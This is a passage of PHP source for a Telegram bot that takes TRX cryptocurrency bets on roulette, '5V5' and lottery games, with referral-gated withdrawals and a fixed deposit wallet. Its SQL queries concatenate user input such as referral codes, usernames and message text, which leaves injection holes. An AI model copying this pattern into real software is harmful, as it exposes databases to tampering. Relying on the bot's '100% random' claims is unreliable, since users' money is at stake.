                        'resize_keyboard' => true
                    )));
                } else {
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ Amount too small to bet !', 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => true,
                        'resize_keyboard' => true
                    )));
                }
            } else {
                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ Please Enter a Valid Bet Amount !', 'reply_markup' => array(
                    'keyboard' => $cancel_keyboard,
                    'one_time_keyboard' => true,
                    'resize_keyboard' => true
                )));
            }
        } else if ($status == 61) {

            $sqasddl = "SELECT game FROM users WHERE tg_id = '" . $tg_id . "'";
            $ressdsds = mysqli_query($Conn, $sqasddl);
            $roww = mysqli_fetch_row($ressdsds);
            $betnum = $roww[0];

            if (is_numeric($text)) {
                if ($text <= 10) {
                    $phnumm = $text;


                    $sqjls = "INSERT INTO game_roulette (tg_id,bet_amount,bet_field) VALUES ('" . $tg_id . "','" . $betnum . "','" . $phnumm . "') ";
                    $rejss = mysqli_query($Conn, $sqjls);

                    $sqls = "UPDATE `users` SET status = 0 WHERE tg_id = '" . $tg_id . "'";
                    $rese = mysqli_query($Conn, $sqls);

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '⛳ Bet Field Added Successfully !

▫ Bet Field: ' . $phnumm));
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "📲 <i>You will be notified soon !</i>", 'reply_markup' => array(
                        'keyboard' => $game_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                } else {
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'Please Enter a Valid Field ! Between 0-10.', 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => true,
                        'resize_keyboard' => true
                    )));
                }
            } else if ($text == "ODD" || $text == "odd") {

                $phnumm = $text;

                $sqjls = "INSERT INTO game_roulette (id,tg_id,bet_amount,bet_field) VALUES (NULL, '" . $tg_id . "','" . $betnum . "','" . $phnumm . "') ";
                $rejss = mysqli_query($Conn, $sqjls);

                $sqls = "UPDATE `users` SET status = 0 WHERE tg_id = '" . $tg_id . "'";
                $rese = mysqli_query($Conn, $sqls);

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '⛳ Bet Field Added Successfully !

▫ Bet Field: ' . $phnumm));
                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'You Will be Notified', 'reply_markup' => array(
                    'keyboard' => $game_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));
            } else if ($text == "EVEN" || $text == "even") {

                $phnumm = $text;

                $sqjls = "INSERT INTO game_roulette (id,tg_id,bet_amount,bet_field) VALUES (NULL, '" . $tg_id . "','" . $betnum . "','" . $phnumm . "') ";
                $rejss = mysqli_query($Conn, $sqjls);

                $sqls = "UPDATE `users` SET status = 0 WHERE tg_id = '" . $tg_id . "'";
                $rese = mysqli_query($Conn, $sqls);

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '⛳ Bet Field Added Successfully !

▫ Bet Field: ' . $phnumm));
                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '📲 <i>You will be notified soon !</i>', 'reply_markup' => array(
                    'keyboard' => $game_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));
            } else if ($text == "RED" || $text == "red") {

                $phnumm = $text;

                $sqjls = "INSERT INTO game_roulette (id,tg_id,bet_amount,bet_field) VALUES (NULL, '" . $tg_id . "','" . $betnum . "','" . $phnumm . "') ";
                $rejss = mysqli_query($Conn, $sqjls);

                $sqls = "UPDATE `users` SET status = 0 WHERE tg_id = '" . $tg_id . "'";
                $rese = mysqli_query($Conn, $sqls);

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '⛳ Bet Field Added Successfully !

▫ Bet Field: ' . $phnumm));
                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '📲 <i>You will be notified soon !</i>', 'reply_markup' => array(
                    'keyboard' => $game_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));
            } else if ($text == "BLUE" || $text == "blue") {

                $phnumm = $text;

                $sqjls = "INSERT INTO game_roulette (id,tg_id,bet_amount,bet_field) VALUES (NULL, '" . $tg_id . "','" . $betnum . "','" . $phnumm . "') ";
                $rejss = mysqli_query($Conn, $sqjls);

                $sqls = "UPDATE `users` SET status = 0 WHERE tg_id = '" . $tg_id . "'";
                $rese = mysqli_query($Conn, $sqls);

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '⛳ Bet Field Added Successfully !

▫ Bet Field: ' . $phnumm));
                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '📲 <i>You will be notified soon !</i>', 'reply_markup' => array(
                    'keyboard' => $game_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));
            } else {
                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'Please Enter a Valid Field ! 0-12 ODD EVEN RED BLUE All in upper case.', 'reply_markup' => array(
                    'keyboard' => $cancel_keyboard,
                    'one_time_keyboard' => true,
                    'resize_keyboard' => true
                )));
            }
        }















        if (strpos($text, '/start') !== false) {

            $tg_referral_code = str_replace('/start ', '', $text);
            $hash_referral = substr(preg_replace('/[0-9_\/]+/', '', base64_encode(sha1($tg_id))), 0, 5);

            if ($tg_referral_code != '/start') {

                if ($start_status == 1) {
                    apiRequestJson("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🔝 Main Menu', 'reply_markup' => array(
                        'keyboard' => $main_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                } else {

                    apiRequestJson("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "🎮 Join our pages to use our bot :

▫ <a href='https://t.me/TRX_Betting_Payments'>@TRX_Betting_Payment 💰</a>

▫ <a href='https://t.me/TRX_Betting_Community'>@TRX_Betting_Community 🗣</a>

⛳ Click <b>🔻 Check Membership 🔺</b> button after you join our pages !", 'reply_markup' => array(
                        'inline_keyboard' => $check_joined_channel,
                        'one_time_keyboard' => true,
                        'resize_keyboard' => true
                    )));
                }

                $sql = "SELECT `tg_id` FROM `users` WHERE tg_id = '" . $tg_id . "' limit 1";
                $result = mysqli_query($Conn, $sql);
                $tguserexists = mysqli_num_rows($result);

                if ($tguserexists == 0) {

                    $sql = "SELECT tg_id FROM users WHERE tg_referral_code = '" . $tg_referral_code . "'";
                    $result = mysqli_query($Conn, $sql);
                    $result_row = mysqli_fetch_row($result);
                    $tg_referral_user = $result_row[0];

                    $sql = "INSERT INTO `users`(`tg_id`, `tg_username`, `tg_firstname`, `tg_lastname`, `tg_referral_code`, `tg_inviter_id`) VALUES ('" . $tg_id . "','" . $tg_username . "','" . $tg_firstname . "','" . $tg_lastname . "','" . $hash_referral . "','" . $tg_referral_code . "')";
                    $result = mysqli_query($Conn, $sql);

                    $sql = "SELECT `total_users` FROM `total_user_counter` WHERE id = 1 limit 1";
                    $result = mysqli_query($Conn, $sql);
                    $result_row = mysqli_fetch_row($result);
                    $total_users = $result_row[0];
                    $total_users = $total_users + 1;

                    $sql = "UPDATE `total_user_counter` SET `total_users` = $total_users WHERE id = 1";
                    $result = mysqli_query($Conn, $sql);
                }
            }

            if ($text == "/start") {

                if ($start_status == 1) {

                    apiRequestJson("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🔝 Main Menu', 'reply_markup' => array(
                        'keyboard' => $main_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                } else {

                    apiRequestJson("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "🎮 Join our pages to use our bot :

▫ <a href='https://t.me/TRX_Betting_Payments'>@TRX_Betting_Payment 💰</a>

▫ <a href='https://t.me/TRX_Betting_Community'>@TRX_Betting_Community 🗣</a>

⛳ Click <b>🔻 Check Membership 🔺</b> button after you join our pages !", 'reply_markup' => array(
                        'inline_keyboard' => $check_joined_channel,
                        'one_time_keyboard' => true,
                        'resize_keyboard' => true
                    )));
                }

                $sql = "SELECT `tg_id` FROM `users` WHERE tg_id = '" . $tg_id . "' limit 1";
                $result = mysqli_query($Conn, $sql);
                $tguserexists = mysqli_num_rows($result);

                if ($tguserexists == 0) {

                    $sql = "INSERT INTO `users`(`tg_id`, `tg_username`, `tg_firstname`, `tg_lastname`, `tg_referral_code`) VALUES ('" . $tg_id . "','" . $tg_username . "','" . $tg_firstname . "','" . $tg_lastname . "','" . $hash_referral . "')";
                    $result = mysqli_query($Conn, $sql);

                    $sql = "SELECT `total_users` FROM `total_user_counter` WHERE id = 1 limit 1";
                    $result = mysqli_query($Conn, $sql);
                    $result_row = mysqli_fetch_row($result);
                    $total_users = $result_row[0];
                    $total_users = $total_users + 1;

                    $sql = "UPDATE `total_user_counter` SET `total_users` = $total_users WHERE id = 1";
                    $result = mysqli_query($Conn, $sql);
                }
            }
        }

        if ($start_status == 1) {
            if ($text === "🖥 Dashboard") {

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "💰 Available Balance : <code>$balance</code> TRX

▫️ <i>TRX Betting || Bot is 100% random betting </i>", 'reply_markup' => array(
                    'keyboard' => $main_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));
            } elseif ($text === "➖ Withdraw") {
                if ($walletAddress == '0') {

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '⛳ Summit your stable TRX wallet address below :

<b>⚠ Warning :</b> <i>You can not change your TRX wallet address after you summit it once so we recommend you to have tronlink wallet cause your withdraw wallet address will be also these !</i>', 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));

                    $sql = "UPDATE `users` SET `status` = 23 WHERE tg_id = '" . $tg_id . "'";
                    $result = mysqli_query($Conn, $sql);
                } else {

                    $sql = "SELECT balance, referral_counter FROM users WHERE tg_id = '" . $tg_id . "'";
                    $result = mysqli_query($Conn, $sql);
                    $row = mysqli_fetch_row($result);
                    $balance = $row[0];
                    $referral_counter = $row[1];

                    if ($balance >= $withdraw_threshold) {
                        if ($referral_counter >= $referral_threshold) {

                            $sql = "UPDATE `users` SET `status` = 20 WHERE tg_id = '" . $tg_id . "'";
                            $result = mysqli_query($Conn, $sql);

                            apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "💰 Your Available Balance is <code>$balance</code>

⚠️ <b>Warning :</b> Don't summit a number more than six (6) decimals withdraw system may not accept it !

▫ How much TRX would you like to withdraw ?", 'reply_markup' => array(
                                'keyboard' => $cancel_keyboard,
                                'one_time_keyboard' => false,
                                'resize_keyboard' => true
                            )));
                        } else {

                            apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'Your Current Balance: ' . $balance . ' TRX
You Have Invited ' . $referral_counter . ' Users.
You can only withdraw After inviting ' . $referral_threshold . ' users.', 'reply_markup' => array(
                                'keyboard' => $main_keyboard,
                                'one_time_keyboard' => false,
                                'resize_keyboard' => true
                            )));
                        }
                    } else {

                        apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '💰 Your Available Balance  : <code>' . $balance . '</code>

❌ Minimum withdraw is ' . $withdraw_threshold . ' TRX', 'reply_markup' => array(
                            'keyboard' => $main_keyboard,
                            'one_time_keyboard' => false,
                            'resize_keyboard' => true
                        )));
                    }
                }
            } elseif ($text === "🎮 Play Games 🎮") {

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🎳 Play with others users & make your TRX double !', 'reply_markup' => array(
                    'keyboard' => $game_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));
            } elseif ($text === "❤‍🔥 Bonus") {

                $decimal = rand(1, 2);
                if ($decimal == 1) {
                    $decimalValue = 123;
                }
                if ($decimal == 2) {
                    $decimalValue = 1234;
                }

                $num = mt_rand(1, 5) / $decimalValue;
                $sqasddl = "SELECT bonus, balance FROM users WHERE tg_id = '" . $tg_id . "'";
                $ressdsds = mysqli_query($Conn, $sqasddl);
                $row = mysqli_fetch_row($ressdsds);
                $bonus = $row[0];
                $bala = $row[1];
                $blall = $bala + $num;

                if ($bonus == 0) {

                    $sqls = "UPDATE `users` SET balance = '" . $blall . "', bonus = 1  WHERE tg_id = '" . $tg_id . "'";
                    $ress = mysqli_query($Conn, $sqls);

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🎁 Congratulation you have got <code>' . $num . '</code> TRX', 'reply_markup' => array(
                        'keyboard' => $main_keyboard,
                        'one_time_keyboard' => true,
                        'resize_keyboard' => true
                    )));
                } else {

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ <i>You have already claimed your bonus comeback tomorrow !</i>', 'reply_markup' => array(
                        'keyboard' => $main_keyboard,
                        'one_time_keyboard' => true,
                        'resize_keyboard' => true
                    )));
                }
            } else if ($text === "🎰 5V5") {

                $sqlewss = "SELECT * FROM game_5v5 WHERE claim = 0 AND valid = 1";
                $resewse = mysqli_query($Conn, $sqlewss);
                $row = mysqli_fetch_row($resewse);
                $usser = mysqli_num_rows($resewse);
                $totTRX = $usser * 10;

                $inkey = array(array(array("text" => "⚠  5V5 Rules", "callback_data" => "rules5v5"), array("text" => "📊 Log", "callback_data" => "log5v5")));


                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🎰 Play 5V5 & make your TRX double !

▫ 5V5 is spinning every 1 hour !', 'reply_markup' => array(
                    'keyboard' => $game_5v5_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "▫ 5V5 is 100% random betting game & easy to win !

⚠<b>Warning :</b> Read the game rules before you start playing !", 'reply_markup' => array(
                    'inline_keyboard' => $inkey,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));
            } else if ($text === "🎰 Start 5V5") {

                if ($balance >= $v5tier1) {

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🔻 Select a tier from given below 🔻', 'reply_markup' => array(
                        'keyboard' => $v5tier_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                } else {
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ Insufficent Balance

▫ You has : <code>' . $balance . '</code> TRX <b>➕ Deposit</b> TRX to bet !', 'reply_markup' => array(
                        'keyboard' => $game_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                }
            } else if ($text === "🎰 5V5 Tier 1") {

                if ($balance >= $v5tier1) {

                    $sqlss = "UPDATE `users` SET status = 50, amount = '" . $v5tier1 . "' WHERE tg_id = '" . $tg_id . "'";
                    $resse = mysqli_query($Conn, $sqlss);

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '⛳ Bet amount is <code>' . $v5tier1 . '</code> TRX

📊 Your Balance : <code>' . $balance . '</code> TRX', 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🔻 Enter your 1st bet digit number ?', 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                } else {
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ Insufficent Balance

▫ You has : <code>' . $balance . '</code> TRX <b>➕ Deposit</b> TRX to bet !', 'reply_markup' => array(
                        'keyboard' => $game_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                }
            } else if ($text === "🎰 5V5 Tier 2") {

                if ($balance >= $v5tier2) {

                    $sqlss = "UPDATE `users` SET status = 50, amount = '" . $v5tier2 . "' WHERE tg_id = '" . $tg_id . "'";
                    $resse = mysqli_query($Conn, $sqlss);

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '⛳ Bet amount is <code>' . $v5tier2 . '</code> TRX

📊 Your Balance : <code>' . $balance . '</code> TRX', 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🔻 Enter your 1st bet digit number ?', 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                } else {
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ Insufficent Balance

▫ You has : <code>' . $balance . '</code> TRX <b>➕ Deposit</b> TRX to bet !', 'reply_markup' => array(
                        'keyboard' => $game_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                }
            } else if ($text === "🎰 5V5 Tier 3") {

                if ($balance >= $v5tier3) {

                    $sqlss = "UPDATE `users` SET status = 50, amount = '" . $v5tier3 . "' WHERE tg_id = '" . $tg_id . "'";
                    $resse = mysqli_query($Conn, $sqlss);

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '⛳ Bet amount is <code>' . $v5tier3 . '</code> TRX

📊 Your Balance : <code>' . $balance . '</code> TRX', 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🔻 Enter your 1st bet digit number ?', 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                } else {
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ Insufficent Balance

▫ You has : <code>' . $balance . '</code> TRX <b>➕ Deposit</b> TRX to bet !', 'reply_markup' => array(
                        'keyboard' => $game_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                }
            } else if ($text === "🎲 Roulette") {


                $sqlewss = "SELECT bet_amount FROM game_roulette WHERE claim = 0 OR claim = 5";
                $resewse = mysqli_query($Conn, $sqlewss);
                $row = mysqli_fetch_row($resewse);
                $usser = mysqli_num_rows($resewse);

                $sqlews = "SELECT SUM(bet_amount) FROM game_roulette WHERE claim = 0 OR claim = 5";
                $resewe = mysqli_query($Conn, $sqlews);
                $row = mysqli_fetch_row($resewe);
                $totTRX = $row[0];
                if ($totTRX < 1) {
                    $totTRX = 0;
                }




                $inkey = array(array(array("text" => "⚠ Rules", "callback_data" => "rules"), array("text" => "📊 Log", "callback_data" => "logroulette")));


                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🎲 Play mini Roulette and make TRX

▫ <i>Roulette is spinning every 60 minutes !</i>', 'reply_markup' => array(
                    'keyboard' => $game_roulette_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "▫ Roulette is choosing bet fields & easy to win or make your TRX double !

⚠<b>Warning :</b> Read the game rules before you start playing !", 'reply_markup' => array(
                    'inline_keyboard' => $inkey,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));
            } else if ($text === "🎲 Start Roulette") {

                if ($balance >= 1) {

                    $sqlss = "UPDATE `users` SET status = 60 WHERE tg_id = '" . $tg_id . "'";
                    $resse = mysqli_query($Conn, $sqlss);

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '▫ Minimum Bet is 1 TRX

📊 Your Balance: ' . $balance . ' TRX', 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🎲 How many TRX would you like to bet ?', 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                } else {
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ Insufficent Balance

▫ You has : <code>' . $balance . '</code> TRX <b>➕ Deposit</b> TRX to bet !', 'reply_markup' => array(
                        'keyboard' => $game_roulette_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                }
            } else if ($text === "🍀 Lucky Spin") {


                $sqlewss = "SELECT * FROM game_lucky WHERE claim = 0";
                $resewse = mysqli_query($Conn, $sqlewss);
                $row = mysqli_fetch_row($resewse);
                $usser = mysqli_num_rows($resewse);
                $totTRX = $usser * 5;

                $inkey = array(array(array("text" => "⚠ Rules", "callback_data" => "ruleslucky"), array("text" => "📊 Log", "callback_data" => "loglucky")));


                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🍀 Play lucky & make your TRX double easily !', 'reply_markup' => array(
                    'keyboard' => $game_lucky_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '▫ Lucky is like a lottery ticket which lucky winner will be chosen 100% randomly !

⚠<b>Warning :</b> Read the game rules before you start playing !', 'reply_markup' => array(
                    'inline_keyboard' => $inkey,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));
            } else if ($text === "🍀 Start Lucky") {

                if ($balance >= $luckytier1) {

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🔻 Select a tier from given below 🔻', 'reply_markup' => array(
                        'keyboard' => $luckytier_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                } else {
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ Insufficent Balance

▫ You has : <code>' . $balance . '</code> TRX <b>➕ Deposit</b> TRX to bet !', 'reply_markup' => array(
                        'keyboard' => $game_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                }
            } else if ($text === "🍀 Lucky Tier 1") {

                if ($balance >= $luckytier1) {

                    $sqlewfass = "SELECT * FROM game_lucky WHERE claim = 0 AND tier = 1";
                    $redasewse = mysqli_query($Conn, $sqlewfass);
                    $ussernum = mysqli_num_rows($redasewse);
                    $usser = $ussernum + 1;

                    $sqjls = "INSERT INTO game_lucky (tg_id,lotid,tier) VALUES ('" . $tg_id . "','" . $usser . "',1) ";
                    $rejss = mysqli_query($Conn, $sqjls);

                    $sqadl = "SELECT balance FROM users WHERE tg_id = '" . $tg_id . "'";
                    $ressds = mysqli_query($Conn, $sqadl);
                    $row = mysqli_fetch_row($ressds);
                    $bala = $row[0];
                    $bala = $bala - $luckytier1;

                    $sqadel = "UPDATE users SET balance = '" . $bala . "' WHERE tg_id = '" . $tg_id . "'";
                    $ressdss = mysqli_query($Conn, $sqadel);

                    five_percent($tg_id, $luckytier1);

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '▫️ Your bet has been recorded !

🔻 ' . $luckytier1 . ' TRX has been substract from your balance !

💳 Current Balance : <code>' . $bala . '</code> TRX', 'reply_markup' => array(
                        'keyboard' => $game_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🎱 Your ticket number is ' . $usser . '

- Good Luck ❗️', 'reply_markup' => array(
                        'keyboard' => $game_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                } else {
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ Insufficent Balance

▫ You has : <code>' . $balance . '</code> TRX <b>➕ Deposit</b> TRX to bet !', 'reply_markup' => array(
                        'keyboard' => $game_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                }
            } else if ($text === "🍀 Lucky Tier 2") {

                if ($balance >= $luckytier2) {

                    $sqlewfass = "SELECT * FROM game_lucky WHERE claim = 0 AND tier = 2";
                    $redasewse = mysqli_query($Conn, $sqlewfass);
                    $ussernum = mysqli_num_rows($redasewse);
                    $usser = $ussernum + 1;

                    $sqjls = "INSERT INTO game_lucky (tg_id,lotid,tier) VALUES ('" . $tg_id . "','" . $usser . "',2) ";
                    $rejss = mysqli_query($Conn, $sqjls);

                    $sqadl = "SELECT balance FROM users WHERE tg_id = '" . $tg_id . "'";
                    $ressds = mysqli_query($Conn, $sqadl);
                    $row = mysqli_fetch_row($ressds);
                    $bala = $row[0];
                    $bala = $bala - $luckytier2;

                    $sqadel = "UPDATE users SET balance = '" . $bala . "' WHERE tg_id = '" . $tg_id . "'";
                    $ressdss = mysqli_query($Conn, $sqadel);

                    five_percent($tg_id, $luckytier2);

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '▫️ Your bet has been recorded !

🔻 ' . $luckytier2 . ' TRX has been substract from your balance !

💳 Current Balance : <code>' . $bala . '</code> TRX', 'reply_markup' => array(
                        'keyboard' => $game_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🎱 Your ticket number is ' . $usser . '

- Good Luck ❗️', 'reply_markup' => array(
                        'keyboard' => $game_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                } else {
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ Insufficent Balance

▫ You has : <code>' . $balance . '</code> TRX <b>➕ Deposit</b> TRX to bet !', 'reply_markup' => array(
                        'keyboard' => $game_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                }
            } else if ($text === "🍀 Lucky Tier 3") {

                if ($balance >= $luckytier3) {

                    $sqlewfass = "SELECT * FROM game_lucky WHERE claim = 0 AND tier = 3";
                    $redasewse = mysqli_query($Conn, $sqlewfass);
                    $ussernum = mysqli_num_rows($redasewse);
                    $usser = $ussernum + 1;

                    $sqjls = "INSERT INTO game_lucky (tg_id,lotid,tier) VALUES ('" . $tg_id . "','" . $usser . "',3) ";
                    $rejss = mysqli_query($Conn, $sqjls);

                    $sqadl = "SELECT balance FROM users WHERE tg_id = '" . $tg_id . "'";
                    $ressds = mysqli_query($Conn, $sqadl);
                    $row = mysqli_fetch_row($ressds);
                    $bala = $row[0];
                    $bala = $bala - $luckytier3;

                    $sqadel = "UPDATE users SET balance = '" . $bala . "' WHERE tg_id = '" . $tg_id . "'";
                    $ressdss = mysqli_query($Conn, $sqadel);

                    five_percent($tg_id, $luckytier3);

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '▫️ Your bet has been recorded !

🔻 ' . $luckytier3 . ' TRX has been substract from your balance !

💳 Current Balance : <code>' . $bala . '</code> TRX', 'reply_markup' => array(
                        'keyboard' => $game_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🎱 Your ticket number is ' . $usser . '

- Good Luck ❗️', 'reply_markup' => array(
                        'keyboard' => $game_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                } else {
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ Insufficent Balance

▫ You has : <code>' . $balance . '</code> TRX <b>➕ Deposit</b> TRX to bet !', 'reply_markup' => array(
                        'keyboard' => $game_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                }
            } elseif ($text === "➕ Deposit") {
                if ($walletAddress == '0') {

                    $sql = "UPDATE `users` SET `status` = 23 WHERE tg_id = '" . $tg_id . "'";
                    $result = mysqli_query($Conn, $sql);

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '⛳ Summit your stable TRX wallet address below :

<b>⚠ Warning :</b> <i>You can not change your TRX wallet address after you summit it once so we recommend you to have tronlink wallet cause your withdraw wallet address will be also these !</i>', 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                } else {

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '<b>⚠ Warning </b>: <i>Deposit TRX with your wallet address you summited it !</i>

▫ Deposit Tron (TRX) only to the below wallet address :

<code>TD1BLYmzFu7zy7e4ttRkjAa6UhiSdd8juJ</code>', 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
